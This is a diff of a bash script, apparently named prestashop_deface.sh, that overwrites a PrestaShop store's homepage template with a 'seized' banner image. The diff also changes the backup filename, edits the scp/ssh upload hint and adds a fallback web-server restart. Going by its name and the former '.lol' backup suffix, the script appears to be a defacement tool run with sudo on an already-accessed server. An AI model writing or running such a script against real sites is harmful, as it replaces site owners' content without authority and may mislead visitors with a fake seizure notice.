@@ -2,7 +2,7 @@
 set -euo pipefail
 
 # Completely replaces index.tpl with seized banner only
-# Usage: sudo bash deface.sh
+# Usage: sudo bash prestashop_deface.sh
 
 PRESTASHOP_ROOT="/var/www/prestashop"
 THEME="classic"
@@ -32,7 +32,7 @@ fi
 
 TEMPLATE_DIR="${PRESTASHOP_ROOT}/themes/${THEME}/templates"
 TARGET="${TEMPLATE_DIR}/index.tpl"
-BACKUP="${TARGET}.lol"
+BACKUP="${TARGET}.aperture.backup"
 IMAGE_PATH="${PRESTASHOP_ROOT}/img/${IMAGE_NAME}"
 
 info "PrestaShop root: ${PRESTASHOP_ROOT}"
@@ -54,7 +54,7 @@ fi
 
 if ! ${SUDO} test -f "${IMAGE_PATH}"; then
   err "Seizure image not found at ${IMAGE_PATH}"
-  err "Upload it with: scp ${IMAGE_NAME} user@host:/tmp/ && ssh user@host \"sudo mv /tmp/${IMAGE_NAME} ${IMAGE_PATH}\""
+  err "Upload it with: scp images/${IMAGE_NAME} user@host:/tmp/ && ssh user@host \"sudo mv /tmp/${IMAGE_NAME} ${IMAGE_PATH}\""
   exit 4
 fi
 
@@ -159,6 +159,9 @@ elif ${SUDO} systemctl --quiet is-active httpd >/dev/null 2>&1; then
 elif ${SUDO} systemctl --quiet is-active nginx >/dev/null 2>&1; then
   ${SUDO} systemctl restart nginx
   info "Nginx restarted"
+elif ${SUDO} command -v service >/dev/null 2>&1; then
+  ${SUDO} service apache2 restart 2>/dev/null || ${SUDO} service httpd restart 2>/dev/null || ${SUDO} service nginx restart 2>/dev/null || true
+  info "Service restart attempted"
 else
   warn "Could not detect/restart web server"
 fi
